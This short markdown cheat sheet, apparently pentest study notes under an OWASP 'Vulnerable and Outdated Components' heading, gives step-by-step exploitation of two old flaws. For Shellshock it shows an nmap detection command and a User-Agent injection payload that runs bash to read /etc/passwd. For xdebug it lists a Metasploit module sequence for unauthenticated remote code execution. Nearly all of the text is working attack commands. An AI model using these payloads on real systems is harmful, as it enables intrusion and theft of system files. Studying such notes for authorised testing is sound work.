# A06 - Vulnerable and Outdated Components

## Shellshock
- CVE-2014-6271 => [Github Exploit](https://github.com/opsxcq/exploit-CVE-2014-6271)
- Discovery
  - ```nmap --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" 192.242.220.3```
- Exploit
  - Intercept the request with Burp Suite
  - Right-click and select "Send to Repeater" Option and Navigate to the Repeater tab
  - Modify the User-Agent and inject the malicious payload: ```() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'```
  - Click on the Send button

## xdebug (< 2.5.5)
- ```msfconsole```
- ```search xdebug```
- ```use exploit/unix/http/xdebug_unauth_exec```
- ```show options```
- Set the RHOST and LHOST
- ```exploit```
